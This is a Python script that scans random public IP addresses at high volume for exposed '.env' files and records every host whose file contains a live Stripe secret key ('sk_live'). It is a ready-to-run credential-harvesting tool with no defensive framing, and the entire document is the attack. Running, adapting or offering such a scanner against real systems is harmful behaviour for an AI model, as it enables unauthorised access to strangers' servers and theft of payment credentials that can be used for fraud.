import aiohttp
import asyncio
import aiofiles
import random
import time

checked_ips = set()
live_sks    = set()
live_ips    = set()

PRIVATE_RANGES = [
    (10, 0, 0, 0, 10, 255, 255, 255),       # 10.0.0.0/8
    (172, 16, 0, 0, 172, 31, 255, 255),     # 172.16.0.0/12
    (192, 168, 0, 0, 192, 168, 255, 255),   # 192.168.0.0/16
    (127, 0, 0, 0, 127, 255, 255, 255),     # 127.0.0.0/8 (loopback)
    (0, 0, 0, 0, 0, 255, 255, 255),         # 0.0.0.0/8
    (224, 0, 0, 0, 239, 255, 255, 255),     # 224.0.0.0/4 (multicast)
    (240, 0, 0, 0, 255, 255, 255, 255),     # 240.0.0.0/4 (reserved)
]

def is_private_ip(a, b, c, d):
    for r in PRIVATE_RANGES:
        if (r[0] <= a <= r[4] and r[1] <= b <= r[5] and 
            r[2] <= c <= r[6] and r[3] <= d <= r[7]):
            return True
    return False

def generate_unique_ip():
    while True:
        a, b, c, d = random.randint(1,254), random.randint(0,255), random.randint(0,255), random.randint(1,254)
        if is_private_ip(a, b, c, d):
            continue
        ip = f"{a}.{b}.{c}.{d}"
        if ip not in checked_ips:
            checked_ips.add(ip)
            return ip

async def save_hit(ip):
    async with aiofiles.open("live_sk.txt", "a") as f:
        await f.write(f"{ip}\n")

async def save_live(ip):
    async with aiofiles.open("live_ips.txt", "a") as f:
        await f.write(f"{ip}\n")

async def IPGenAndEnvCheck(session):
    ip = generate_unique_ip()
    try:
        async with session.get(f"http://{ip}/.env", timeout=aiohttp.ClientTimeout(total=5), allow_redirects=False, ssl=False) as resp:
            if resp.status == 200:
                text = await resp.text()
                if 'sk_live' in text:
                    print(f"{ip} - LIVE SK FOUND ✅")
                    await save_hit(ip)
                    live_sks.add(ip)
                else:
                    print(f"{ip} - NOT FOUND SK 🚫")
                    await save_live(ip)
                    live_ips.add(ip)
            else:
                print(f"{ip} - {resp.status}")
    except:
        print(f"{ip} - INVALID")

async def main():
    start_time = time.time()
    connector = aiohttp.TCPConnector(limit=1000, ttl_dns_cache=300, force_close=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        while True:
            tasks = [IPGenAndEnvCheck(session) for _ in range(10000)]
            await asyncio.gather(*tasks)
            taken = time.time() - start_time
            hour, minute, second = int(taken // 3600), int((taken % 3600) // 60), int(taken % 60)
            stats = f'Total Checked: {len(checked_ips)} | Live SKs: {len(live_sks)} | Live IPs: {len(live_ips)} | Time Elapsed: {hour:02}h:{minute:02}m:{second:02}s'
            print(stats)
            with open("stats.txt", "w") as stats_file:
                stats_file.write(stats + "\n")

asyncio.run(main())